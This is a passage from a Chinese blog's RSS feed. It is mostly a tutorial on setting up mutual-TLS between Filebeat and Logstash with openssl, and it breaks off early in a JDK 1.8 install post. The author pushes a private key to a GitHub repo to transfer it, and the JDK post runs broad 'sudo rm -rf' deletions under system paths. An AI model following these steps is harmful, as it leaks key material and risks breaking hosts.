href="https://m01ly.github.io/2020/09/11/elk-login/">elk笔记二–通过X-Pack权限控制设置elk登录</a>，这里给出logstash配置（/etc/logstash/conf.d/logstash.conf）参考如下：</p><pre class="line-numbers language-yaml"><code class="language-yaml">input &amp;<span class="token comment" spellcheck="true">#123;</span>    stdin &amp;<span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats &amp;<span class="token comment" spellcheck="true">#123;</span>        port =<span class="token punctuation">></span> 5044    &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span>output &amp;<span class="token comment" spellcheck="true">#123;</span>    elasticsearch &amp;<span class="token comment" spellcheck="true">#123;</span>        hosts =<span class="token punctuation">></span> <span class="token punctuation">[</span><span class="token string">"10.65.18.112:9200"</span><span class="token punctuation">]</span>        index =<span class="token punctuation">></span> "filebeats<span class="token punctuation">-</span>%&amp;<span class="token comment" spellcheck="true">#123;+YYYY.MM.dd&amp;#125;"</span>        user =<span class="token punctuation">></span> "elastic"<span class="token comment" spellcheck="true">#登录ES的账户</span>        password =<span class="token punctuation">></span> "xxx"<span class="token comment" spellcheck="true">#登录ES的密码口令</span>    &amp;<span class="token comment" spellcheck="true">#125;</span>    stdout &amp;<span class="token comment" spellcheck="true">#123;</span>        codec =<span class="token punctuation">></span> rubydebug     &amp;<span class="token comment" spellcheck="true">#125;</span>&amp;<span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="6-filebeat和logstash加密传输配置"><a href="#6-filebeat和logstash加密传输配置" class="headerlink" title="6   filebeat和logstash加密传输配置"></a>6   filebeat和logstash加密传输配置</h1><h2 id="6-1-生成证书"><a href="#6-1-生成证书" class="headerlink" title="6.1 生成证书"></a>6.1 生成证书</h2><p>本文采用openssl生成证书，根证书目前使用的是自签证书（即内置的公钥可验证该证书本身），命名为ca.crt。本文配置的是双向证书，即filebeat和logstash交互共需要两套证书，这里我采用从同一CA签发（当然两套也可以采用不同的两个CA签发），分别为logstash.crt和filebeat.crt。（也可以使用 直接利用的<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.5/certutil.html">Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil</a>来制作需要的证书，可以参考<a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">Filebeat与Logstash配置SSL加密通信</a> ）</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615361929310.png" alt="1615361929310"></p><p>logstash端应该有的证书：ca.crt,logstash,crt.logstash.key</p><p>filebeat端应该有的证书：ca.crt,filebeat,crt.filebeat.key</p><p>利用openssl生成证书很方便，只需要主机上装openssl即可，运行openssl version查看版本，若没安装，运行以下命令安装：</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> opensslyum <span class="token function">install</span> openssl-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>首先生成证书机器的选择可以随意，这里我选择在logstash主机上生成所有的证书，然后将filebeat的证书拷贝到其机器即可。</p><h3 id="6-1-1-制作自签的CA证书"><a href="#6-1-1-制作自签的CA证书" class="headerlink" title="6.1.1 制作自签的CA证书"></a>6.1.1 制作自签的CA证书</h3><p>（1）创建certs证书目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> /etc/logstash/certs<span class="token function">cd</span> /etc/logstash/certs<span class="token comment" spellcheck="true">#进入证书目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）生成ca密钥</p><pre class="line-numbers language-bash"><code class="language-bash">openssl genrsa 2048 <span class="token operator">></span> ca.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615362913575.png" alt="1615362913575"></p><p>（3）使用ca私钥建立ca证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -new -x509 -nodes -days 3650 -key ca.key -out ca.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的是参数Common Name为域名，这里填为*.eniot.io，其他参数可以直接enter为空。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615362976782.png" alt="1615362976782"></p><h3 id="6-1-2-制作logstash使用的证书"><a href="#6-1-2-制作logstash使用的证书" class="headerlink" title="6.1.2  制作logstash使用的证书"></a>6.1.2  制作logstash使用的证书</h3><p>继续在logstash主机的/etc/logstash/certs目录下生成。</p><p>（1）生成logstash服务器csr证书请求文件</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -newkey rsa:2048 -days 3650 -nodes -keyout logstash.key -out logstash.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的参数为Common Name为logstash服务的域名：*.eniot.io，challenge password为为该证书请求文件设置密码，这里可以直接为空即可；其他参数直接enter为空即可。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363233359.png" alt="1615363233359"></p><p>（2）使用ca证书与ca私钥，请求文件logstash.csr签发服务器证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -req -in logstash.csr -days 3650 -CA ca.crt -CAkey ca.key -set_serial 01 <span class="token operator">></span> logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363431449.png" alt="1615363431449"></p><p>至此logstash需要的证书已经生成完成：ca.crt,logstash.crt,logstash.key</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363508360.png" alt="1615363508360"></p><h3 id="6-1-3-制作filebeat使用的证书"><a href="#6-1-3-制作filebeat使用的证书" class="headerlink" title="6.1.3  制作filebeat使用的证书"></a>6.1.3  制作filebeat使用的证书</h3><p>继续在logstash主机的/etc/logstash/certs目录下生成。</p><p>（1）生成filebeat服务器csr证书请求文件</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -newkey rsa:2048 -days 3650 -nodes -keyout filebeat.key -out filebeat.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中值得注意的参数为Common Name为filebeat服务的域名：*.eniot.io，challenge password为为该证书请求文件设置密码，这里可以直接为空即可；其他参数直接enter为空即可。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363607580.png" alt="1615363607580"></p><p>（2）使用ca证书与ca私钥，请求文件filebeat.csr签发服务器证书</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -req -in filebeat.csr -days 3650 -CA ca.crt -CAkey ca.key -set_serial 01 <span class="token operator">></span> filebeat.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615366665677.png" alt="1615366665677"></p><p>至此filebeat所需要的证书ca.crt,filebeat.crt,filebeat.key已经生成完毕。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615363783351.png" alt="1615363783351"></p><h3 id="6-1-4-检查生成的openssl证书"><a href="#6-1-4-检查生成的openssl证书" class="headerlink" title="6.1.4 检查生成的openssl证书"></a>6.1.4 检查生成的openssl证书</h3><p>（1）查看KEY信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl rsa -noout -text -in ca.key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查看CSR信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl req -noout -text -in logstash.csr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）查看证书信息</p><pre class="line-numbers language-bash"><code class="language-bash">openssl x509 -noout -text -in ca.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）验证证书</p><p>会提示self signed</p><pre class="line-numbers language-bash"><code class="language-bash">openssl verify logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（5） 因为myserver.crt 是幅ca.crt发布的，所以会验证成功</p><pre class="line-numbers language-bash"><code class="language-bash">openssl verify -CAfile ca.crt logstash.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>去掉key的密码保护</p><p>有时候每次都要输入密码太繁琐了,可以把Key的保护密码去掉</p><pre class="line-numbers language-bash"><code class="language-bash">openssl rsa -in logstash.key -out logstash.key.insecure<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="6-2-配置证书"><a href="#6-2-配置证书" class="headerlink" title="6.2 配置证书"></a>6.2 配置证书</h2><h3 id="6-2-1-logstash配置证书"><a href="#6-2-1-logstash配置证书" class="headerlink" title="6.2.1 logstash配置证书"></a>6.2.1 logstash配置证书</h3><p>（1）/etc/logstash/conf.d/logstash.conf上配置证书路径</p><p>主要需要修改是input节中设置ssl的参数，具体参数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf input <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    stdin <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        port <span class="token operator">=</span><span class="token operator">></span> 5044        ssl <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>        ssl_certificate_authorities <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"/etc/logstash/certs/ca.crt"</span><span class="token punctuation">]</span>        ssl_certificate <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"/etc/logstash/certs/logstash.crt"</span>        ssl_key <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"/etc/logstash/certs/logstash.key"</span>        ssl_verify_mode <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"force_peer"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>output <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    elasticsearch <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        hosts <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"xxxx:9200"</span><span class="token punctuation">]</span>        index <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"filebeats-%&amp;#123;+YYYY.MM.dd&amp;#125;"</span>        user <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"elastic"</span>        password <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"xxxx"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    stdout <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        codec <span class="token operator">=</span><span class="token operator">></span> rubydebug     <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）查看logstash进程，并kill掉</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span><span class="token function">grep</span> logstash<span class="token comment" spellcheck="true">#查看logstash进程</span><span class="token function">kill</span> -9 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）重新启动logstash，这里不要以后台方式运行，直接运行下面命令，如果出错可以看到错误信息。没有出错信息就继续往下（不要用systemctl start logstash启动方式，因为该方式不会加载logstash.conf配置文件启动）</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）带证书访问logstash</p><p> 在运行Filebeat之前 ,另外开个终端，<a href="https://www.elastic.co/guide/en/beats/filebeat/6.5/configuring-ssl-logstash.html#testing-ssl-logstash">带证书访问</a>，可以使用curl来验证logstash证书是否成功（启动logstash后，再带证书访问时，可能会有延迟，多试几次）</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#带证书访问：</span>curl -v --cacert /etc/logstash/certs/ca.crt https://域名:5044curl -v --cacert /etc/logstash/certs/ca.crt https://ip:5044curl -v --cacert /etc/filebeat/certs/ca.crt https://10.65.18.112:5044curl -v --cacert /etc/filebeat/certs/ca.crt https://archery-sec0002.eniot.io:5044<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>返回如下信息则连接成功：</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615364370400.png" alt="1615364370400"></p><p>返回如下信息则连接失败：<img src="/2021/02/19/install-guide-elk-filebeats/1615364645594.png" alt="1615364645594"></p><p>（5）后台方式运行logstash</p><p>证书访问成功后，即可以后台方式长时间运行logstash</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-2-2-复制filebeat证书"><a href="#6-2-2-复制filebeat证书" class="headerlink" title="6.2.2 复制filebeat证书"></a>6.2.2 复制filebeat证书</h3><p>因为之前的证书都是再logstash主机上生成的，因此我们需要吧filebeat相关证书（ca.crt,filebeat.crt,filebeat.key）从logstash主机复制filebeat主机。这里如果知道主机账户密码可以直接用scp命令，直接看6.2.3节。因为我使用的是堡垒机，不知道主机密码，因为我开始使用的是堡垒机文件夹的上传下载功能，突然发现堡垒机的这个功能有巨坑：上传下载有大小限制，所以这样传过去的证书是不完整的，用起来会一直报no pem file /etc/filebeat/certs/filebeat.crt; file is not a certificate adding/etc/filebeat/certs/ca.pem to the list of known CAs错误，这个真的坑死我了，弄了好久才发现。后面尝试用git来运输文件。</p><h4 id="6-2-2-1-logstash主机上传文件到git"><a href="#6-2-2-1-logstash主机上传文件到git" class="headerlink" title="6.2.2.1 logstash主机上传文件到git"></a>6.2.2.1 logstash主机上传文件到git</h4><p>上传ca.crt  filebeat.key filebeat.crt，3个文件到git：</p><p>（1）进入证书目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/logstash/certs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）下载git项目(随便建一个，或者用已经存在的)，并ca.crt  filebeat.key filebeat.crt将复制到项目文件夹gitalk</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/m01ly/gitalk<span class="token function">cp</span> filebeat.crt gitalk/<span class="token function">cp</span> ca.crt gitalk/<span class="token function">cp</span> filebeat.key gitalk/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365664125.png" alt="1615365664125"></p><p>（2）添加所有需要上传的文件和配置到git</p><p>git add FILE添加确定的文件FILE<br>git add .添加当前目录下所有文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> gitalk<span class="token punctuation">[</span>root@xxxx gitalk<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git add .</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（3）提交文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> commit -m <span class="token string">'filebeat log message'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上述命令<strong>必须添加</strong>‘-m’及‘log message’，其中log message可以自己随便填写，否则是提交不成功的，在后面的<strong>push操作</strong>中会提示错误：“error:src refspec master does not match any”</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365765658.png" alt="1615365765658"></p><p>至此，我们就已经<strong>提交文件到本地仓库</strong>了！</p><p>现在我们需要将上述本地仓库里的文件<strong>添加到远程库</strong>！</p><p>（4）在github里添加origin</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote add origin https://github.com/m01ly/gitalk.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果之前配置过一次，再次配置则会提示以下错误：<br><strong>ERROR</strong>：远程 origin 已经存在。<br>此时只需要将远程配置删除，重新添加即可；</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> remote <span class="token function">rm</span> origin<span class="token function">git</span> remote add origin https://github.com/m01ly/gitalk.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>再次提交文件即可正常使用</p><p>（5）上传文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> push -u origin main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365843590.png" alt="1615365843590"></p><p>网页访问git，发现文件上传成功</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615365900784.png" alt="1615365900784"></p><h4 id="6-2-2-2-filebeat主机从git下载文件"><a href="#6-2-2-2-filebeat主机从git下载文件" class="headerlink" title="6.2.2.2 filebeat主机从git下载文件"></a>6.2.2.2 filebeat主机从git下载文件</h4><p>以下全程再filebeat主机上操作。</p><p>（1）进入证书目录，下载git项目</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/filebeat/<span class="token function">git</span> clone https://github.com/m01ly/gitalk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（2）修改文件夹gitalk为certs，可以看到filebeat相关证书已经下载成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> gitalk certs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1615366185610.png" alt="1615366185610"></p><h3 id="6-2-3-filebeat配置证书"><a href="#6-2-3-filebeat配置证书" class="headerlink" title="6.2.3 filebeat配置证书"></a>6.2.3 filebeat配置证书</h3><p>（1）配置证书</p><p>配置/etc/filebeat/filebeat.yml 文件，在output.logstash节点加上3行ssl相关参数为证书路径如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cp</span> /etc/filebeat/filebeat.yml /etc/filebeat/filebeat0.yml<span class="token function">vi</span> /etc/filebeat/filebeat.yml output.logstash:  <span class="token comment" spellcheck="true"># The Logstash hosts</span>  <span class="token comment" spellcheck="true">#hosts: ["localhost:5044"]</span>  hosts: <span class="token punctuation">[</span><span class="token string">"archery-sec0002.eniot.io:5044"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#这里配置logstash地址，如果是内网最好用域名访问</span>  ssl.certificate_authorities: <span class="token punctuation">[</span><span class="token string">"/etc/filebeat/certs/ca.crt"</span><span class="token punctuation">]</span>  ssl.certificate: <span class="token string">"/etc/filebeat/certs/filebeat.crt"</span>  ssl.key: <span class="token string">"/etc/filebeat/certs/filebeat.key"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）重启filebeat</p><p>运行下面命令启动filebeat（用以下方式启动的原因是因为报错的时候，方便看日志，如果采用systemctl restart filebeat方式启动，如果启动失败，日志不好找，参考<a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">Filebeat插件启动失败，不能直接查找报错原因</a>）</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -e -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以 看到日志中有Connection to backoff(async(tcp://xx.xx.io:5044)) established信息，则表示连接成功。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615358106512.png" alt="1615358106512"></p><h1 id="7-树莓派上装filebeat"><a href="#7-树莓派上装filebeat" class="headerlink" title="7 树莓派上装filebeat"></a>7 树莓派上装filebeat</h1><p>在实际生产项目中，收集日志的可能都是简单的树莓派系统，因此我也尝试再树莓派上安装filebeat，按照网上的一篇教程在<a href="https://www.jianshu.com/p/979663160cb2">Raspberry PI 3上安装Filebeat</a>，博主写的很详细，照着做就可以，这里面有个坑需要提一下，在make update是会报错如下图：一片红，根据描述信息可以看出是python版本不符合，谷歌了一波也没得到解决，然后忽略他，继续安装启动filebeat正常。这里的错误有人可以解决的话，可以写在评论区一起交流。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615879776960.png" alt="1615879776960"></p><p>注意二：</p><p>用/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -e -v来启动filebeat，自己尝试/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeat -path.logs /var/log/filebeat语句 会无回显，启动失败。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /lib/systemd/system/filebeat.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>[Unit]Description=filebeatDocumentation=https://www.elastic.co/guide/en/beats/filebeat/current/index.htmlWants=userwork-online.targetAfter=network-online.target[Service]ExecStart=/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -e -vRestart=always[Install]WantedBy=multi-user.target</code></pre><h1 id="8-Kibana查看上传的日志"><a href="#8-Kibana查看上传的日志" class="headerlink" title="8  Kibana查看上传的日志"></a>8  Kibana查看上传的日志</h1><p>（1）建立索引模式</p><p>登录kibana，然后点击链接“stack Management”→”index patterns”–&gt;”Create index pattern”–&gt;输入filebeats-*，然后一直next完成即创建索引模式成功。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1618382014523.png" alt="1618382014523"></p><p>（2）查看上传的日志内容</p><p>Home-&gt;”Discover”–选中所建立的index pattern，就可以看到上传的日志信息。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1618382093420.png" alt="1618382093420"></p><p>（3）筛选上传的日志信息</p><p>在下图1处 输入 筛选表达式对日志进行筛选，然后按enter或者右边的update按钮，即可看到过滤后的数据。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1618382258008.png" alt="1618382258008"></p><h1 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h1><ol><li><p><a href="https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/">elk笔记一—suricata+elk搭建入侵检测系统</a></p></li><li><p><a href="https://m01ly.github.io/2020/09/11/elk-login/">elk笔记二–通过X-Pack权限控制设置elk登录</a></p></li><li><p><a href="https://m01ly.github.io/2020/09/11/install-guide-suricata/">centos7中安装suricata</a></p></li></ol><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol><li><p><a href="https://www.elastic.co/guide/en/beats/filebeat/6.5/configuring-ssl-logstash.html">使用SSL与Logstash进行安全通信官方配置</a>  官方配置</p></li><li><p><a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">Filebeat插件启动失败，不能直接查找报错原因</a>  很有用</p></li><li><p><a href="https://www.cnblogs.com/galsnag/articles/10144170.html">filebeat与logstash实现ssl加密传输 </a>第1次参考方案</p></li><li><p><a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">Filebeat与Logstash配置SSL加密通信</a>  第二次参考方案-目前 直接利用的Elasticsearch随安装包提供的数字证书工具elasticsearch-certutil来制作需要的证书 </p></li><li><p><a href="https://www.cnblogs.com/sanduzxcvbnm/p/12055038.html">filebeat.yml配置文件详细说明</a> 当字典检索</p></li><li><p><a href="https://blog.csdn.net/vip100549/article/details/79657574">使用Filebeat 6 收集多个目录的日志并发送到lostash</a></p></li><li><p><a href="https://www.cnblogs.com/chen8023miss/p/12082093.html">git上传linux文件到GitHub上</a></p></li><li><p><a href="https://www.jianshu.com/p/f5f93c89155e">openssl 查看证书</a>  制作过程中可以检验，我传输的证书有缺陷就是用这个检验出来的</p></li><li><p><a href="https://blog.csdn.net/cowbin2012/article/details/100134114">证书具体参数说明</a></p></li><li><p><a href="https://ningyu1.github.io/site/post/51-ssl-cert/">Openssl生成自签名证书的多种方式</a>  本文生成证书参考的</p></li><li><p><a href="https://mp.weixin.qq.com/s/qm8bmJPfH8kC9yHDqxL6aA">威胁狩猎：基于ELK的日志监控</a>  值得看的结构   后面再看看</p></li><li><p><a href="https://www.elastic.co/cn/blog/configuring-ssl-tls-and-https-to-secure-elasticsearch-kibana-beats-and-logstash#run-filebeat">配置 SSL、TLS 以及 HTTPS 来确保 Elasticsearch、Kibana、Beats 和 Logstash 的安全</a>  官网参考配置   后面再看看</p></li><li><p><a href="https://www.jianshu.com/p/979663160cb2">Raspberry PI 3上安装Filebeat</a>]翻译自<a href="https://www.programmersought.com/article/31601555670/">Install Filebeat on Raspberry PI 3</a> 本文参考</p></li></ol>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86/">日志管理</category>
      
      
      <comments>https://m01ly.github.io/2021/02/19/install-guide-elk-filebeats/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>linux安装jdk1.8</title>
      <link>https://m01ly.github.io/2021/02/18/linux-jdk8/</link>
      <guid>https://m01ly.github.io/2021/02/18/linux-jdk8/</guid>
      <pubDate>Thu, 18 Feb 2021 07:22:20 GMT</pubDate>
      
      <description>&lt;p&gt;很多软件的安装都需要java8的环境，如何再Linux安装java8环境呢？&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>很多软件的安装都需要java8的环境，如何再Linux安装java8环境呢？</p><a id="more"></a><h1 id="1-查看旧版本"><a href="#1-查看旧版本" class="headerlink" title="1 查看旧版本"></a>1 查看旧版本</h1><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">which</span> java<span class="token function">whereis</span> javajava -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604406880320.png" alt="1604406880320"></p><h1 id="2-替换成1-8版本"><a href="#2-替换成1-8版本" class="headerlink" title="2 替换成1.8版本"></a>2 替换成1.8版本</h1><p>可以发现本机上有两个java，但是目前使用的是1.7的，直接修改/etc/profile配置文件，讲JAVA_HOME修改为1.8jdk所在的路径即可。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603862700214.png" alt="1603862700214"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1604407037055.png" alt="1604407037055"></p><p>这里可以看到centos7自带的仅仅是jre，并没有装jdk，此时最好卸载自带的重新安装jdk8</p><h2 id="3-重新安装1-8"><a href="#3-重新安装1-8" class="headerlink" title="3 重新安装1.8"></a>3 重新安装1.8</h2><p>若原主机没有1.8版本，则此时需要先卸载旧版本，再安装1.8版本。</p><h2 id="3-1-卸载旧版本"><a href="#3-1-卸载旧版本" class="headerlink" title="3.1 卸载旧版本"></a>3.1 卸载旧版本</h2><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum remove java-1.8.0-openjdk#采用yum install -y java-1.8.0-openjdk方式安装的卸载方法</span><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># find / -name java</span>/etc/pki/ca-trust/extracted/java/etc/pki/java/etc/alternatives/java/etc/java/var/lib/alternatives/java/usr/bin/java/usr/lib/java/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java/usr/share/elasticsearch/jdk/bin/java/usr/share/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/ca-trust/extracted/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/pki/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /etc/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/alternatives/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.262.b10-0.el7_8.x86_64/jre/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/elasticsearch/jdk/bin/java<span class="token function">sudo</span> <span class="token function">rm</span> -rf /usr/share/java<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-安装1-8版本java"><a href="#3-2-安装1-8版本java" class="headerlink" title="3.2 安装1.8版本java"></a>3.2 安装1.8版本java</h2><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，<strong>而那个不带-devel的安装完了其实是jre。</strong> </p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603870468396.png" alt="1603870468396"></p><h2 id="3-3-修改环境变量"><a href="#3-3-修改环境变量" class="headerlink" title="3.3 修改环境变量"></a>3.3 修改环境变量</h2><pre class="line-numbers 